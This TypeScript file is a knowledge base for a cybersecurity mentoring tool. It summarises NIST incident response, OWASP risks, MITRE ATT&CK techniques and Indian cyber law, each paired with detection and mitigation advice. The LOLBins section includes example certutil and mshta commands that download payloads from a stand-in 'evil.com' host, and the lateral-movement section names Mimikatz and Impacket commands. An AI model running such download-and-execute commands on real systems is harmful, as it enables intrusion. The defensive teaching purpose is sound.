// =============================================================================
// CyberShield Bharat -- AI Mentor Knowledge Base Loader
// Structured KB chunks for RAG (Retrieval-Augmented Generation) in the Mentor module
// =============================================================================

export type KBSource = 'NIST_SP_800_61' | 'OWASP_TOP_10' | 'MITRE_ATTACK' | 'CERT_IN' | 'IT_ACT_2000'

export interface KBChunk {
  /** Unique chunk identifier */
  id: string
  /** Authoritative source document */
  source: KBSource
  /** Title of this knowledge chunk */
  title: string
  /** Full text content of the chunk */
  content: string
  /** Tags for semantic filtering */
  tags: string[]
  /**
   * Vector embedding of the content (null in mock mode).
   * In production, computed via text-embedding-3-small or sentence-transformers.
   * Stored in Pinecone / pgvector for similarity search.
   */
  embedding: number[] | null
}

export const MENTOR_KB: KBChunk[] = [
  // ---------------------------------------------------------------------------
  // NIST SP 800-61 Rev 2 -- Incident Response
  // ---------------------------------------------------------------------------
  {
    id: 'KB-NIST-001',
    source: 'NIST_SP_800_61',
    title: 'Incident Response Lifecycle: Four Phases Overview',
    content: `NIST SP 800-61 Rev 2 defines the computer security incident response lifecycle in four phases:

1. PREPARATION: Establishing an incident response capability before incidents occur. This includes creating an incident response policy and plan, developing procedures, establishing communications guidelines, procuring necessary tools and resources, and training staff. Key deliverables: IR policy, contact list, IR toolkit, trained CSIRT team.

2. DETECTION AND ANALYSIS: Identifying potential incidents through monitoring alerts, analyzing indicators of compromise (IOCs), and prioritizing incidents based on severity. Analysts review logs from SIEM, IDS/IPS, EDR, and other sources. Challenge: distinguishing true positives from false positives. Key metrics: Mean Time to Detect (MTTD).

3. CONTAINMENT, ERADICATION, AND RECOVERY: Choosing a containment strategy (short-term vs long-term), eradicating the root cause (removing malware, patching vulnerabilities, disabling compromised accounts), and recovering systems to normal operation. Key metrics: Mean Time to Respond (MTTR), Mean Time to Recover (MTTRec).

4. POST-INCIDENT ACTIVITY: Holding a "lessons learned" meeting within 2 weeks of incident resolution. Identifying what happened, what was done well, what could be improved, and updating IR documentation. Output: post-incident report, updated playbooks, risk register updates.`,
    tags: ['incident-response', 'NIST', 'IR-lifecycle', 'CSIRT', 'phases'],
    embedding: null,
  },
  {
    id: 'KB-NIST-002',
    source: 'NIST_SP_800_61',
    title: 'Incident Prioritization and Severity Classification',
    content: `NIST SP 800-61 recommends prioritizing incidents based on two dimensions: business impact and technical severity.

FUNCTIONAL IMPACT CATEGORIES:
- None: No effect on the organization's ability to provide services
- Low: Minimal effect; organization can still provide all critical services
- Medium: Organization has lost ability to provide a critical service to a subset of users
- High: Organization is no longer able to provide some critical services to any users

INFORMATION IMPACT CATEGORIES:
- None: No information was exfiltrated, changed, deleted, or otherwise compromised
- Privacy Breach: Sensitive personally identifiable information (PII) compromised
- Proprietary Breach: Unclassified proprietary information accessed
- Integrity Loss: Sensitive or proprietary information was changed or deleted

RECOVERABILITY EFFORT CATEGORIES:
- Regular: Time to recover is predictable with existing resources
- Supplemented: Additional resources required from outside the organization
- Extended: Recovery exceeds normal response capabilities
- Not Recoverable: Recovery is not possible (e.g., sensitive data exfiltrated and publicized)

In Indian context (CERT-In framework), incidents are classified as Critical, High, Medium, and Low aligned with impact on Critical Information Infrastructure (CII) sectors.`,
    tags: ['incident-response', 'NIST', 'severity', 'classification', 'prioritization'],
    embedding: null,
  },
  {
    id: 'KB-NIST-003',
    source: 'NIST_SP_800_61',
    title: 'Evidence Collection and Chain of Custody',
    content: `Proper evidence collection is critical for both incident resolution and potential legal proceedings under the IT Act 2000.

ORDER OF VOLATILITY (collect most volatile first):
1. CPU registers and cache
2. Routing table, ARP cache, process table, kernel statistics, RAM
3. Temporary file systems
4. Non-volatile storage (hard disk, SSD)
5. Remote logging and monitoring data
6. Physical configuration and network topology
7. Archival media (backups, tapes)

CHAIN OF CUSTODY REQUIREMENTS:
- Document who collected the evidence, when, where, and how
- Use cryptographic hashes (SHA-256) to verify evidence integrity
- Store evidence in write-protected containers
- Maintain access log for all evidence handling
- Use forensic imaging tools (FTK, Autopsy, dd) for disk captures

LEGAL ADMISSIBILITY IN INDIA:
- Section 65B of Indian Evidence Act 1872: Electronic records must be accompanied by a certificate from a responsible official
- Evidence must be collected following proper procedure to be admissible in court under IT Act 2000
- Chain of custody documentation is mandatory for prosecution under Sections 43, 66, 66A-F of IT Act`,
    tags: ['forensics', 'evidence', 'chain-of-custody', 'NIST', 'legal', 'IT-Act'],
    embedding: null,
  },
  // ---------------------------------------------------------------------------
  // OWASP Top 10
  // ---------------------------------------------------------------------------
  {
    id: 'KB-OWASP-001',
    source: 'OWASP_TOP_10',
    title: 'A03:2021 - Injection: SQL, LDAP, OS Command, and SSTI',
    content: `OWASP A03:2021 Injection is the third most critical web application security risk. An application is vulnerable when user-supplied data is not validated, filtered, or sanitized before being interpreted by the interpreter.

TYPES OF INJECTION:
- SQL Injection: User input concatenated into SQL queries. Enables data exfiltration, authentication bypass, and (with xp_cmdshell) OS command execution.
- LDAP Injection: Unsanitized input in LDAP queries. Can bypass authentication or extract directory information.
- OS Command Injection: User input passed to shell commands. Achieves RCE as the application user.
- Server-Side Template Injection (SSTI): User input in template engine expressions (Jinja2, Twig, Pebble). Can achieve RCE through template evaluation.
- CRLF Injection: Injecting carriage-return/line-feed characters to manipulate HTTP response headers.

PREVENTION:
1. Use parameterized queries (prepared statements) — preferred over escaping
2. Use stored procedures with limited permissions
3. Validate input against strict allowlists (whitelist, not blacklist)
4. Use an ORM but still be careful with raw() queries
5. Apply least-privilege database accounts (SELECT only, no DROP/ALTER)
6. Use SAST tools: Semgrep, CodeQL, SonarQube to detect injection patterns in CI/CD

Indian regulatory context: SQL injection leading to data breach may constitute an offence under IT Act Section 43(b) (unauthorized access) and 66C (identity theft).`,
    tags: ['injection', 'sql-injection', 'OWASP', 'XSS', 'command-injection', 'SSTI'],
    embedding: null,
  },
  {
    id: 'KB-OWASP-002',
    source: 'OWASP_TOP_10',
    title: 'A07:2021 - Identification and Authentication Failures',
    content: `Authentication weaknesses are the seventh most common vulnerability class per OWASP 2021.

VULNERABLE PATTERNS:
- Permitting automated credential stuffing attacks (no rate limiting, no CAPTCHA)
- Permitting brute force or other automated attacks
- Using weak/default passwords or storing passwords as MD5/SHA-1 hashes
- Using weak or ineffective credential recovery processes (security questions)
- Using plain text, encrypted, or weakly hashed passwords
- Missing or ineffective MFA
- Session IDs exposed in URLs
- Not properly invalidating session tokens after logout or timeout

SECURE IMPLEMENTATION:
1. Implement MFA, especially for privileged accounts — FIDO2/WebAuthn preferred
2. Use bcrypt/scrypt/Argon2id for password hashing (NOT MD5, SHA-1, or plain SHA-256)
3. Implement account lockout or exponential backoff after N failed login attempts
4. Check new passwords against breach databases (HIBP Pwned Passwords API)
5. Invalidate server-side session tokens on logout (stateful sessions)
6. Use secure, randomly generated session identifiers (min 128 bits entropy)
7. Implement PKCE for OAuth 2.0 flows

Indian context: CERT-In Directive May 2022 requires all Indian entities to maintain logs of privileged user logins and enable MFA for critical systems.`,
    tags: ['authentication', 'MFA', 'passwords', 'session-management', 'OWASP', 'HIBP'],
    embedding: null,
  },
  {
    id: 'KB-OWASP-003',
    source: 'OWASP_TOP_10',
    title: 'A08:2021 - Software and Data Integrity Failures',
    content: `Software and Data Integrity Failures relate to code and infrastructure not being protected against integrity violations. This includes insecure deserialization and supply chain attacks.

DESERIALIZATION VULNERABILITIES:
- Java serialization: ObjectInputStream.readObject() on attacker data enables RCE via gadget chains
- Python pickle: pickle.loads() on untrusted data is equivalent to eval()
- PHP unserialize: Magic methods (__wakeup, __destruct) called on deserialized objects
- .NET BinaryFormatter (deprecated): Known RCE gadget chains via TypeConfuseDelegate

SUPPLY CHAIN ATTACKS:
- Dependency confusion: Attackers publish malicious packages with same name as internal packages to public registries
- Typosquatting: Packages with names similar to legitimate ones (e.g., "request" vs "requests" in Python)
- Compromised maintainer accounts: Attacker takes over legitimate package and pushes malicious update
- CI/CD pipeline injection: Malicious code injected into build scripts

PREVENTION:
1. Avoid Java serialization; prefer JSON/XML with strict schema validation
2. Use digital signatures for software updates and packages (Sigstore, package signing)
3. Pin dependencies to specific hash-verified versions in lockfiles
4. Review security alerts from GitHub Dependabot, npm audit, pip-audit
5. Implement SBOMs (Software Bill of Materials) and track component provenance
6. Separate CI/CD pipeline credentials from production; principle of least privilege

Real-world: XZ Utils backdoor (CVE-2024-3094), SolarWinds SUNBURST, Codecov bash uploader all exploited software integrity failures.`,
    tags: ['deserialization', 'supply-chain', 'SBOM', 'OWASP', 'integrity', 'dependencies'],
    embedding: null,
  },
  // ---------------------------------------------------------------------------
  // MITRE ATT&CK
  // ---------------------------------------------------------------------------
  {
    id: 'KB-MITRE-001',
    source: 'MITRE_ATTACK',
    title: 'Persistence Techniques: Registry Run Keys, Scheduled Tasks, and Services',
    content: `Adversaries establish persistence to maintain access across system restarts and user logoffs. Three common Windows persistence mechanisms:

1. REGISTRY RUN KEYS (T1547.001):
Malware adds entries to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run or HKLM equivalent.
The value points to the malware executable and runs on every user login.
Detection: Monitor registry modifications to Run keys (Sysmon Event ID 13, 14).
Mitigation: Restricted access to HKLM keys; alert on new HKCU Run values for standard users.

2. SCHEDULED TASKS (T1053.005):
schtasks.exe or Windows Task Scheduler API creates tasks running at boot, login, or intervals.
Used by APT groups to run payloads without appearing in process tree.
Detection: Event ID 4698 (Scheduled Task Created), 4702 (Modified). Monitor schtasks.exe execution with /create flag.
Mitigation: Audit scheduled task list baseline; alert on new tasks with SYSTEM privileges.

3. WINDOWS SERVICES (T1543.003):
sc.exe create or registry-based service creation pointing to malware binary.
Service runs as SYSTEM, ensuring high-privilege persistence.
Detection: Event ID 7045 (New Service Installed). Alert on services in non-standard paths.
Mitigation: Require signed binaries for services; use WDAC policy to restrict service installation.

Indian APT activity: SideWinder group uses scheduled tasks for persistence in Indian government targeting. Lazarus uses Registry Run Keys for banking sector persistence.`,
    tags: ['persistence', 'MITRE-ATT&CK', 'registry', 'scheduled-tasks', 'windows-services', 'detection'],
    embedding: null,
  },
  {
    id: 'KB-MITRE-002',
    source: 'MITRE_ATTACK',
    title: 'Lateral Movement: Pass-the-Hash, Pass-the-Ticket, and Remote Services',
    content: `Lateral movement allows adversaries to progressively move through a network environment after initial compromise.

PASS-THE-HASH (T1550.002):
NTLM authentication can be performed using the NT hash of a password without knowing the cleartext.
Tool: Mimikatz sekurlsa::pth, Impacket's wmiexec.py, psexec.py.
Requires: Local admin on source, NTLM allowed on target.
Detection: Event ID 4624 (Type 3 Logon) with NTLM from unusual source. Alert on Mimikatz signatures.
Mitigation: Enable Windows Defender Credential Guard; disable NTLM where possible; use Protected Users group.

PASS-THE-TICKET (T1550.003):
Kerberos tickets (TGTs or TGS) stolen from LSASS memory and used to impersonate the ticket owner.
Golden Ticket: Forged using KRBTGT hash — valid for any service in the domain, bypasses all auth.
Silver Ticket: Forged TGS for a specific service — harder to detect, no DC contact needed.
Detection: Event ID 4769 (TGS Request) with unusual encryption types (RC4 vs AES); 4768 from unusual hosts.
Mitigation: Rotate KRBTGT account password twice (invalidates existing Golden Tickets); enable AES encryption.

REMOTE SERVICES (T1021):
Using legitimate remote access tools: RDP (T1021.001), SMB (T1021.002), WinRM (T1021.006).
Detection: Unusual RDP connections between workstations (admin-to-workstation is abnormal).
Mitigation: Disable RDP on non-management workstations; implement Jump Server / PAW architecture.`,
    tags: ['lateral-movement', 'pass-the-hash', 'Kerberos', 'MITRE-ATT&CK', 'Mimikatz', 'RDP'],
    embedding: null,
  },
  {
    id: 'KB-MITRE-003',
    source: 'MITRE_ATTACK',
    title: 'Defense Evasion: Living-off-the-Land Binaries (LOLBins) and Obfuscation',
    content: `Adversaries use legitimate system tools to evade detection by blending with normal administrative activity.

LIVING-OFF-THE-LAND BINARIES (T1218):
LOLBins are signed Microsoft binaries that can be abused to execute arbitrary code.
Common examples:
- certutil.exe: Download files (certutil -urlcache -split -f http://evil.com/payload.exe)
- regsvr32.exe: Register DLLs or execute scriptlets (Squiblydoo technique)
- mshta.exe: Execute VBScript/JScript from URL (mshta http://evil.com/payload.hta)
- wmic.exe: Execute commands via WMI (wmic process call create "cmd.exe /c ...")
- rundll32.exe: Execute DLL exports
- PowerShell with -EncodedCommand: Obfuscated PowerShell via Base64
Detection: Alert on certutil network connections; mshta spawning child processes; unusual rundll32 invocations.

OBFUSCATION (T1027):
- PowerShell: String concatenation, backticks, char codes to evade string-based AV
- JavaScript: eval() with base64 decode chains; variable renaming
- PE packing: UPX, custom packers; high entropy sections
- Steganography: Malware payload hidden in image EXIF or pixel data
Detection: AMSI (Antimalware Scan Interface) for PowerShell; memory scanning for unpacked code.
Mitigation: Script block logging (HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging); constrained language mode.`,
    tags: ['defense-evasion', 'LOLBins', 'obfuscation', 'MITRE-ATT&CK', 'PowerShell', 'AMSI'],
    embedding: null,
  },
  // ---------------------------------------------------------------------------
  // CERT-In
  // ---------------------------------------------------------------------------
  {
    id: 'KB-CERTIN-001',
    source: 'CERT_IN',
    title: 'CERT-In Mandatory Incident Reporting: 6-Hour Rule (April 2022 Directive)',
    content: `CERT-In Direction under Section 70B(6) of IT Act 2000, issued April 28, 2022, mandates incident reporting within 6 hours of noticing or being brought to notice about incidents.

COVERED ENTITIES:
All service providers, intermediaries, data centres, body corporates, and government organisations in India.

REPORTABLE INCIDENTS (non-exhaustive list):
- Targeted scanning/probing of critical networks/systems
- Compromise of critical systems/information
- Unauthorised access to IT systems/data
- Defacement of website or intrusion into a website and unauthorised changes such as inserting malicious code, links to external websites etc.
- Malicious code attacks such as spreading of virus/worm/Trojan/Bots/Spyware/Ransomware/Cryptominers
- Attack on servers such as Database, Mail and DNS
- Identity Theft, spoofing and phishing attacks
- Fake mobile Apps
- Unauthorised access to social media accounts
- Attacks or incident affecting Digital Payment systems
- Data Breach
- Data Leak
- Attacks on Internet of Things (IoT) devices and associated systems, networks, software, servers
- Attacks or malicious/suspicious activities affecting Cloud computing systems/servers/software/applications
- Attacks or malicious/suspicious activities affecting systems related to Big Data, Block chain, virtual assets, virtual asset exchanges, custodian wallets, Robotics, 3D and 4D Printing, additive manufacturing, Drones
- Attacks or malicious/suspicious activities affecting systems related to Artificial Intelligence and Machine Learning

REPORTING FORMAT:
Incident reports to be submitted at incident@cert-in.org.in with: organization details, incident type, date/time, systems affected, impact assessment, action taken.

ADDITIONAL REQUIREMENTS:
- Maintain logs for 180 days in Indian jurisdiction
- Provide systems/logs for CERT-In investigation when required
- ICT service providers must designate a Point of Contact (PoC) and register with CERT-In`,
    tags: ['CERT-In', 'incident-reporting', 'compliance', 'India', 'mandatory', '6-hour-rule'],
    embedding: null,
  },
  {
    id: 'KB-CERTIN-002',
    source: 'CERT_IN',
    title: 'CERT-In Critical Information Infrastructure Protection',
    content: `Critical Information Infrastructure (CII) is defined under Section 70 of IT Act 2000 as computer resources where incapacitation or destruction would have a debilitating impact on national security, economy, public health or safety.

DECLARED CII SECTORS IN INDIA:
1. Power and Energy: POSOCO, NTPC, Power Grid Corporation, state DISCOMs
2. Finance: RBI, SEBI, NPCI, major banks, payment gateways
3. Telecom: BSNL, Airtel, Jio, TRAI-licensed operators
4. Transport: Indian Railways, DMRC, major airports, port trusts
5. Government/E-Governance: NIC, UIDAI, DigiLocker, MeitY systems
6. Healthcare: AIIMS, large public hospital networks, Ayushman Bharat digital systems
7. Water: Water treatment and distribution systems in major cities
8. Space: ISRO systems and satellite communication ground stations

NCIIPC (National Critical Information Infrastructure Protection Centre) under NTRO is the nodal agency for CII protection.

PENALTIES FOR CII COMPROMISE:
- Unauthorized access/damage to CII: IT Act Section 66F — up to life imprisonment
- For state-sponsored attacks: treated as act of cyber terrorism
- Organizations facilitating compromise through negligence: Section 43A penalties apply

INCIDENT NOTIFICATION FOR CII ORGANIZATIONS:
Immediate (within 1 hour) notification to NCIIPC and CERT-In is expected, not just the 6-hour general deadline.`,
    tags: ['CERT-In', 'CII', 'critical-infrastructure', 'NCIIPC', 'India', 'compliance', 'IT-Act'],
    embedding: null,
  },
  // ---------------------------------------------------------------------------
  // IT Act 2000
  // ---------------------------------------------------------------------------
  {
    id: 'KB-ITACT-001',
    source: 'IT_ACT_2000',
    title: 'IT Act 2000: Key Cybercrime Sections for SOC Analysts',
    content: `The Information Technology Act 2000 (amended 2008) is India's primary cybercrime legislation.

SECTION 43 — Penalty for damage to computer resources (civil):
Unauthorized access, downloading, introduction of virus/contaminant, damage, disruption, denial of access. Penalty: Compensation up to Rs 1 crore to the affected person.

SECTION 43A — Body corporate handling sensitive personal data (civil):
Any body corporate that possesses, deals, or handles sensitive personal data and is negligent in implementing reasonable security practices causing wrongful loss. Penalty: Compensation to affected persons.

SECTION 66 — Computer related offences (criminal):
Acts done dishonestly or fraudulently under Section 43. Punishment: Up to 3 years imprisonment and/or Rs 5 lakh fine.

SECTION 66B — Receiving stolen computer resource (criminal):
Dishonestly receiving or retaining stolen computer resource. Punishment: Up to 3 years and/or Rs 1 lakh fine.

SECTION 66C — Identity theft (criminal):
Fraudulently or dishonestly making use of electronic signature, password, or any other unique identification feature of another person. Punishment: Up to 3 years and Rs 1 lakh fine.

SECTION 66D — Cheating by personation (criminal):
Cheating by impersonating as another person using computer resource. Punishment: Up to 3 years and Rs 1 lakh fine.

SECTION 66E — Violation of privacy (criminal):
Intentionally capturing, publishing, or transmitting image of private area of a person. Punishment: Up to 3 years and Rs 2 lakh fine.

SECTION 66F — Cyber terrorism (criminal):
With intent to threaten unity, integrity, security, or sovereignty of India, accessing computer resources to cause death/injury, damage critical systems, or introduce malware. Punishment: Life imprisonment.`,
    tags: ['IT-Act-2000', 'cybercrime', 'legal', 'India', 'Section-66', 'Section-43', 'compliance'],
    embedding: null,
  },
  {
    id: 'KB-ITACT-002',
    source: 'IT_ACT_2000',
    title: 'IT Act Section 70: Protected Systems and Critical Infrastructure',
    content: `Section 70 of the IT Act 2000 authorizes the Central Government to declare any computer resource as a "Protected System" by notification in the Official Gazette.

PROTECTED SYSTEM DESIGNATION:
- Once declared, unauthorized access or attempt to access is an offence
- Only authorized persons as notified by the Central Government may access Protected Systems
- Punishment for unauthorized access: Up to 10 years imprisonment and fine

SECTION 70A — National Nodal Agency:
Government may designate a national nodal agency for critical information infrastructure protection. NCIIPC (National Critical Information Infrastructure Protection Centre) has been designated under this section, functioning under NTRO.

SECTION 70B — Computer Emergency Response Team:
CERT-In (Indian Computer Emergency Response Team) has been designated as the national agency. Functions include:
- Collection, analysis, and dissemination of information on cyber incidents
- Forecast and alerts of cyber security incidents
- Emergency measures for handling cyber security incidents
- Coordination of cyber incident response activities
- Issue guidelines, advisories, vulnerability notes, and whitepapers

IMPLICATIONS FOR ORGANIZATIONS:
- Organizations operating Protected Systems must maintain strict access controls, audit logs, and incident response capabilities
- Failure to comply with CERT-In directions (Section 70B) attracts penalties: imprisonment up to 1 year and/or fine Rs 1 lakh for individual; Rs 1 lakh per day for company

NOTIFICATION OF APPOINTMENTS:
Organizations with access to Protected Systems must notify NCIIPC of all authorized personnel, and maintain and update these lists. Any unauthorized access must be reported immediately.`,
    tags: ['IT-Act-2000', 'Section-70', 'NCIIPC', 'CERT-In', 'protected-systems', 'compliance'],
    embedding: null,
  },
  {
    id: 'KB-ITACT-003',
    source: 'IT_ACT_2000',
    title: 'PDPB 2023 / DPDP Act: Data Principal Rights and Obligations',
    content: `The Digital Personal Data Protection Act 2023 (DPDP Act) was enacted to regulate the processing of digital personal data in India.

KEY DEFINITIONS:
- Data Principal: Individual to whom the personal data relates (also includes parent/guardian for children)
- Data Fiduciary: Entity that determines the purpose and means of processing personal data
- Data Processor: Entity that processes personal data on behalf of a Data Fiduciary
- Significant Data Fiduciary: Data Fiduciary notified by Central Government based on volume, sensitivity, risk to national security or public order

DATA PRINCIPAL RIGHTS:
1. Right to access information about personal data processed
2. Right to correction and erasure of personal data
3. Right to grievance redressal
4. Right to nominate another individual to exercise rights in case of incapacity or death

DATA FIDUCIARY OBLIGATIONS:
1. Process personal data only for lawful purposes with valid consent
2. Give notice: clear, plain language description of data collected and its purpose
3. Implement reasonable security safeguards to prevent data breach
4. Report data breach to Data Protection Board of India (DPBI) and affected Data Principals
5. Erase data when purpose is fulfilled or consent withdrawn
6. Appoint a Data Protection Officer (DPO) if designated as Significant Data Fiduciary

PENALTIES:
- Failure to implement adequate safeguards leading to breach: Up to Rs 250 crore
- Failure to notify breach to Board: Up to Rs 200 crore
- Non-compliance with Board orders: Up to Rs 50 crore
- Multiple penalties can be imposed cumulatively

RELATIONSHIP TO IT ACT: DPDP Act supplements IT Act 2000 Section 43A (reasonable security practices). The two acts operate in parallel.`,
    tags: ['DPDP-Act', 'privacy', 'data-protection', 'India', 'compliance', 'PDPB', 'legal'],
    embedding: null,
  },
  {
    id: 'KB-NIST-004',
    source: 'NIST_SP_800_61',
    title: 'Incident Response Communication: Internal and External Notification',
    content: `Effective incident communication prevents operational confusion and manages legal and reputational risk.

INTERNAL COMMUNICATIONS:
- Establish a command structure (IC - Incident Commander, tech lead, legal, communications)
- Use out-of-band communication channels (Signal, WhatsApp, phone calls) if primary IT systems may be compromised
- Need-to-know principle: avoid broadcasting incident details on public Slack/Teams channels
- Document all decisions and actions in incident timeline (who decided what, when, and why)

EXTERNAL COMMUNICATIONS — LAW ENFORCEMENT:
- Report cybercrime to CyberCrime portal (cybercrime.gov.in) or state Cyber Cell
- For serious incidents: Contact CERT-In within 6 hours (mandatory per April 2022 directive)
- For CII: Notify NCIIPC within 1 hour
- For financial fraud: Report to RBI Financial Stability Unit if NBFC/bank; NPCI if UPI-related

EXTERNAL COMMUNICATIONS — AFFECTED PARTIES:
- Notify affected users as quickly as feasible (DPDP Act requires notification to DPBI "without delay")
- Draft notification must include: incident nature, personal data categories involved, approximate number of data principals affected, likely consequences, measures taken/proposed
- Do NOT make premature statements about root cause or scope before investigation is complete

MEDIA AND PUBLIC COMMUNICATIONS:
- Designate a single spokesperson (usually Legal + Communications lead)
- Factual, concise statements only; avoid speculation
- Coordinate timing with regulatory notifications
- Monitoring social media for misinformation that could exacerbate panic

RANSOMWARE COMMUNICATION NOTE:
CERT-In advisory: Do not negotiate with attackers or pay ransoms without first consulting law enforcement and CERT-In. Payment does not guarantee data deletion or key delivery.`,
    tags: ['incident-response', 'communication', 'NIST', 'CERT-In', 'legal', 'ransomware', 'notification'],
    embedding: null,
  },
  {
    id: 'KB-MITRE-004',
    source: 'MITRE_ATTACK',
    title: 'Command and Control: Domain Fronting and DNS-over-HTTPS Evasion',
    content: `Advanced threat actors use legitimate cloud infrastructure and encrypted DNS to conceal command-and-control (C2) communications.

DOMAIN FRONTING (T1090.004):
Domain fronting exploits the difference between the TLS SNI header (which specifies the intended host) and the HTTP Host header inside the encrypted connection.
- Traffic appears to go to a legitimate CDN (Cloudflare, Akamai, Google) in network logs
- Inside TLS tunnel, requests are routed to the actual C2 domain
- Major CDN providers have blocked domain fronting in recent years (Google: 2018, AWS: 2018, Azure: 2019, Cloudflare: still partially possible)
- Detection: Correlate JA3 TLS fingerprints with expected CDN fingerprints; monitor for SNI/Host header mismatch using TLS inspection

DNS-OVER-HTTPS C2 (T1071.004):
Malware encodes C2 instructions in DNS queries/responses tunneled over HTTPS to public DoH resolvers (8.8.8.8/resolve, 1.1.1.1/dns-query).
- Bypasses corporate DNS monitoring since traffic goes to well-known HTTPS endpoints
- SideWinder APT uses this technique against Indian targets (CERT-In advisory 2023)
- Detection: Monitor for unusual volume of HTTPS connections to known DoH providers (1.1.1.1, 8.8.8.8); content inspection at proxy for DoH API patterns
- Mitigation: Force all DNS through corporate resolver; block DoH endpoints at proxy/firewall; enable DNS Security Extensions (DNSSEC)

HTTPS C2 BEACONING:
Cobalt Strike and similar frameworks beacon over HTTPS with malleable C2 profiles to mimic legitimate web traffic (jQuery CDN, Microsoft CDN, etc.).
Detection: Machine learning-based beacon detection (consistent inter-arrival times, fixed-size packets); JA3 fingerprint matching against known Cobalt Strike signatures (e.g., JA3: 51c64c77e60f3980eea90869b68c58a8).`,
    tags: ['C2', 'domain-fronting', 'DNS-over-HTTPS', 'MITRE-ATT&CK', 'detection', 'evasion', 'Cobalt-Strike'],
    embedding: null,
  },
]

/**
 * Returns all KB chunks, optionally filtered by source or tags.
 */
export function loadMentorKB(
  filter?: { source?: KBSource; tags?: string[] }
): KBChunk[] {
  if (!filter) return MENTOR_KB

  return MENTOR_KB.filter((chunk) => {
    if (filter.source && chunk.source !== filter.source) return false
    if (filter.tags && !filter.tags.some((tag) => chunk.tags.includes(tag))) return false
    return true
  })
}

/**
 * Simple keyword-based retrieval for demo mode (no vector DB required).
 * In production, replace with cosine similarity search on embeddings.
 */
export function retrieveRelevantChunks(query: string, topK = 3): KBChunk[] {
  const queryLower = query.toLowerCase()
  const scored = MENTOR_KB.map((chunk) => {
    const titleScore = chunk.title.toLowerCase().split(' ')
      .filter((w) => queryLower.includes(w) && w.length > 3).length * 3
    const tagScore = chunk.tags
      .filter((t) => queryLower.includes(t.toLowerCase().replace(/-/g, ' '))).length * 2
    const contentScore = chunk.content.toLowerCase().split(' ')
      .filter((w) => queryLower.includes(w) && w.length > 4).length

    return { chunk, score: titleScore + tagScore + contentScore }
  })

  return scored
    .sort((a, b) => b.score - a.score)
    .slice(0, topK)
    .map((s) => s.chunk)
}
